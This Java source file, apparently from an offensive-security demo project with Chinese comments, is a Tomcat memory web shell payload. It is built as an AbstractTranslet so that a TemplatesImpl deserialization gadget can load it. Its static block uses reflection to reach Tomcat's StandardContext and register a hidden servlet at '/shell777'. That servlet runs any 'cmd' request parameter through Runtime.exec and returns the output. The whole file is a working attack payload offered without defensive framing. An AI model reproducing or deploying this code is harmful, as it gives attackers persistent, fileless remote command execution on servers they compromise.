package com.example.demo.Static;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

public class TemplatesImplServlet extends AbstractTranslet implements Servlet {
    static private String servletName ="evilServlet1";
    static private String servletUrl = "/shell777";
    static{
        try {
            ServletContext servletContext = getServletContext();
            StandardContext standardContext = getStandardContext(servletContext);
            Servlet evilServlet = new TemplatesImplServlet();
            Wrapper newWrapper = standardContext.createWrapper();
            newWrapper.setName(servletName);
            newWrapper.setLoadOnStartup(1);
            newWrapper.setServlet(evilServlet);
            // 向 children 中添加 Wrapper
            standardContext.addChild(newWrapper);
            // 添加 servlet 的映射
            standardContext.addServletMapping(servletUrl, servletName);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
    private static ServletContext getServletContext()
            throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        ServletRequest servletRequest = null;
        Class c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        java.lang.reflect.Field f = c.getDeclaredField("lastServicedRequest");
        f.setAccessible(true);
        ThreadLocal threadLocal = (ThreadLocal) f.get(null);
        // 不为空则意味着第一次反序列化的准备工作已成功
        if (threadLocal != null && threadLocal.get() != null) {
            servletRequest = (ServletRequest) threadLocal.get();
        }
        if (servletRequest != null){
            return servletRequest.getServletContext();
        }
        return null;
    }
    private static StandardContext getStandardContext(ServletContext servletContext) throws NoSuchFieldException, IllegalAccessException {
        StandardContext standardContext = null;
        // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
        while (standardContext == null) {
            // 因为是 StandardContext 对象是私有属性，所以需要用反射去获取
            Field f = servletContext.getClass().getDeclaredField("context");
            f.setAccessible(true);
            Object object = f.get(servletContext);
            if (object instanceof ServletContext) {
                servletContext = (ServletContext) object;
            } else if (object instanceof StandardContext) {
                standardContext = (StandardContext) object;
                return standardContext;
            }
        }
        return null;
    }
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {
    }
    @Override
    public ServletConfig getServletConfig() {
        return null;
    }
    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        servletResponse.setContentType("text/html");
        PrintWriter out = servletResponse.getWriter();
        String cmd = servletRequest.getParameter("cmd");
        if(cmd != null){
            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String result = scanner.hasNext() ? scanner.next() : "";
            out.println(result);
        }
    }
    @Override
    public String getServletInfo() {
        return null;
    }
    @Override
    public void destroy() {
    }
}